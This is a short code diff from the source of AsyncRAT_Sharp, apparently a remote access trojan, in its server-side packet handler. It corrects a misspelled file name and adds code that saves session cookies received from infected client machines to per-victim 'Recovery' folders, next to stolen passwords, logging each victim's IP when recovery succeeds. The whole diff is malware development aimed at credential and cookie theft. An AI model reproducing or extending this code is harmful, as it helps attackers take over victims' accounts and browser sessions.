@@ -65,10 +65,15 @@ namespace AsyncRAT_Sharp.Handle_Packet
                             string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID + "\\Recovery");
                             if (!Directory.Exists(fullPath))
                                 Directory.CreateDirectory(fullPath);
-                            File.WriteAllText(fullPath + "\\Passowrds.txt", unpack_msgpack.ForcePathObject("Password").AsString);
-                            if (File.ReadAllText(fullPath + "\\Passowrds.txt").Length > 23)
+                            File.WriteAllText(fullPath + "\\Passwords.txt", unpack_msgpack.ForcePathObject("Password").AsString);
+                            if (File.ReadAllText(fullPath + "\\Passwords.txt").Length > 23)
                             {
                                 new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} recovered passwords successfully", Color.Purple);
+                            }
+                            File.WriteAllText(fullPath + "\\Cookies.txt", unpack_msgpack.ForcePathObject("Cookies").AsString);
+                            if (File.ReadAllText(fullPath + "\\Cookies.txt").Length > 23)
+                            {
+                                new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} recovered cookies successfully", Color.Purple);
                             }
                             break;
                         }
